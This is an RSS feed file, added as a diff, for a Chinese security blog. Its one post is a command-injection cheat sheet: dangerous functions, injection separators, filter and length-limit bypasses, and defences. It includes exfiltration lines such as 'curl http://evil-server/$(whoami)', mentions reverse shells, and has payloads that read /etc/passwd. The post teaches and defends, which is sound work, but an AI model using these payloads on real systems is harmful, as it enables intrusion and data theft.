@@ -1,0 +1,204 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Khala • Posts by &#34;函数&#34; tag</title>
+        <link>https://mobius-0.github.io</link>
+        <description>GLHF</description>
+        <language>zh-CN</language>
+        <pubDate>Sat, 26 Nov 2022 17:30:44 +0800</pubDate>
+        <lastBuildDate>Sat, 26 Nov 2022 17:30:44 +0800</lastBuildDate>
+        <category>Hexo</category>
+        <category>shoya</category>
+        <category>网站</category>
+        <category>网络安全</category>
+        <category>工具</category>
+        <category>虚拟机</category>
+        <category>星际争霸2</category>
+        <category>平衡</category>
+        <category>杂谈</category>
+        <category>小说</category>
+        <category>江南</category>
+        <category>龙族</category>
+        <category>动画</category>
+        <category>法律法规</category>
+        <category>域名</category>
+        <category>DNS</category>
+        <category>WEB</category>
+        <category>HTTP</category>
+        <category>计算机网络</category>
+        <category>IPSec</category>
+        <category>VPN</category>
+        <category>SSL</category>
+        <category>TLS</category>
+        <category>WiFi</category>
+        <category>邮件</category>
+        <category>网络协议</category>
+        <category>Linux</category>
+        <category>渗透</category>
+        <category>信息收集</category>
+        <category>痕迹清理</category>
+        <category>Windows</category>
+        <category>ASP</category>
+        <category>CSharp</category>
+        <category>Golang</category>
+        <category>Java</category>
+        <category>语言</category>
+        <category>反序列化</category>
+        <category>混淆</category>
+        <category>沙箱</category>
+        <category>类</category>
+        <category>JDK</category>
+        <category>JavaScript</category>
+        <category>PHP</category>
+        <category>PowerShell</category>
+        <category>Python</category>
+        <category>Ruby</category>
+        <category>Shell</category>
+        <category>漏洞</category>
+        <category>CSRF</category>
+        <category>服务器</category>
+        <category>SQL注入</category>
+        <category>SSRF</category>
+        <category>Cache</category>
+        <category>XSS</category>
+        <category>XXE</category>
+        <category>XML</category>
+        <category>Xpath</category>
+        <category>注入</category>
+        <category>函数</category>
+        <category>绕过</category>
+        <category>遍历</category>
+        <category>包含</category>
+        <category>文件</category>
+        <category>目录</category>
+        <category>读取</category>
+        <category>上传</category>
+        <category>中间件</category>
+        <category>IIS</category>
+        <category>Apache</category>
+        <category>Nginx</category>
+        <category>逻辑</category>
+        <category>策略配置</category>
+        <category>端口</category>
+        <category>社会工程学</category>
+        <category>搜索</category>
+        <item>
+            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/</guid>
+            <title>命令注入</title>
+            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/</link>
+            <category>注入</category>
+            <category>函数</category>
+            <category>绕过</category>
+            <pubDate>Sat, 26 Nov 2022 17:30:44 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
+&lt;p&gt;命令注入通常因为指 Web 应用在服务器上拼接系统命令而造成的漏洞。&lt;/p&gt;
+&lt;p&gt;该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些 Web 管理界面的配置主机名 / IP / 掩码 / 网关、查看系统信息以及关闭重启等功能，或者一些站点提供如 ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。&lt;/p&gt;
+&lt;h1 id=&#34;常见危险函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见危险函数&#34;&gt;#&lt;/a&gt; 常见危险函数&lt;/h1&gt;
+&lt;h2 id=&#34;php&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php&#34;&gt;#&lt;/a&gt; PHP&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;system&lt;/li&gt;
+&lt;li&gt;exec&lt;/li&gt;
+&lt;li&gt;passthru&lt;/li&gt;
+&lt;li&gt;shell_exec&lt;/li&gt;
+&lt;li&gt;popen&lt;/li&gt;
+&lt;li&gt;proc_open&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;python&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python&#34;&gt;#&lt;/a&gt; Python&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;system&lt;/li&gt;
+&lt;li&gt;popen&lt;/li&gt;
+&lt;li&gt;subprocess.call&lt;/li&gt;
+&lt;li&gt;spawn&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;java&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#java&#34;&gt;#&lt;/a&gt; Java&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;java.lang.Runtime.getRuntime().exec(command)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;常见注入方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见注入方式&#34;&gt;#&lt;/a&gt; 常见注入方式&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;分号分割&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;||&lt;/code&gt;   &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;   &lt;code&gt;&amp;amp;&lt;/code&gt;  分割&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;|&lt;/code&gt;  管道符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\r\n&lt;/code&gt;   &lt;code&gt;%d0%a0&lt;/code&gt;  换行&lt;/li&gt;
+&lt;li&gt;反引号解析&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$()&lt;/code&gt;  替换&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;无回显技巧&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无回显技巧&#34;&gt;#&lt;/a&gt; 无回显技巧&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;bash 反弹 shell&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;DNS 带外数据&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;http 带外&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;curl http://evil-server/$(whoami)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wget http://evil-server/$(whoami)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;无带外时利用  &lt;code&gt;sleep&lt;/code&gt;  或其他逻辑构造布尔条件&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;常见绕过方式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见绕过方式&#34;&gt;#&lt;/a&gt; 常见绕过方式&lt;/h1&gt;
+&lt;h2 id=&#34;空格绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#空格绕过&#34;&gt;#&lt;/a&gt; 空格绕过&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;  符号  &lt;code&gt;cat&amp;lt;123&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\t&lt;/code&gt;  /  &lt;code&gt;%09&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$&amp;#123;IFS&amp;#125;&lt;/code&gt;   其中 {} 用来截断，比如 &lt;code&gt;cat$IFS2&lt;/code&gt;  会被认为 IFS2 是变量名。另外，在后面加个 $ 可以起到截断的作用，一般用 $9，因为 $9 是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;黑名单绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#黑名单绕过&#34;&gt;#&lt;/a&gt; 黑名单绕过&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;a=l;b=s;$a$b&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;base64  &lt;code&gt;echo &amp;quot;bHM=&amp;quot; | base64 -d&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/?in/?s&lt;/code&gt;  =&amp;gt;  &lt;code&gt;/bin/ls&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;连接符  &lt;code&gt;cat /etc/pass&#39;w&#39;d&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;未定义的初始化变量  &lt;code&gt;cat$x /etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;长度限制绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#长度限制绕过&#34;&gt;#&lt;/a&gt; 长度限制绕过&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt;wget\
+&amp;gt;foo.\
+&amp;gt;com
+ls -t&amp;gt;a
+sh a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上面的方法为通过命令行重定向写入命令，接着通过 ls 按时间排序把命令写入文件，最后执行 直接在 Linux 终端下执行的话，创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如 w,[之类的短命令，(使用 ls /usr/bin/? 查看) 如果不添加命令，需要 Ctrl+D 才能结束，这样就等于标准输入流的重定向 而在 php 中，使用 shell_exec 等执行系统命令的函数的时候，是不存在标准输入流的，所以可以直接创建文件&lt;/p&gt;
+&lt;h1 id=&#34;常用符号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用符号&#34;&gt;#&lt;/a&gt; 常用符号&lt;/h1&gt;
+&lt;h2 id=&#34;命令分隔符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令分隔符&#34;&gt;#&lt;/a&gt; 命令分隔符&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;%0a&lt;/code&gt;  /  &lt;code&gt;%0d&lt;/code&gt;  /  &lt;code&gt;\n&lt;/code&gt;  /  &lt;code&gt;\r&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;  /  &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;通配符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通配符&#34;&gt;#&lt;/a&gt; 通配符&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;*&lt;/code&gt;  0 到无穷个任意字符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;?&lt;/code&gt;  一个任意字符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;[ ]&lt;/code&gt;  一个在括号内的字符，e.g.  &lt;code&gt;[abcd]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;[ - ]&lt;/code&gt;  在编码顺序内的所有字符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;[^ ]&lt;/code&gt;  一个不在括号内的字符&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;防御&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御&#34;&gt;#&lt;/a&gt; 防御&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;不使用时禁用相应函数&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;尽量不要执行外部的应用程序或命令&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;做输入的格式检查&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;转义命令中的所有 shell 元字符&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;shell 元字符包括  &lt;code&gt;#&amp;amp;;`,|*?~&amp;lt;&amp;gt;^()[]&amp;#123;&amp;#125;$\&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
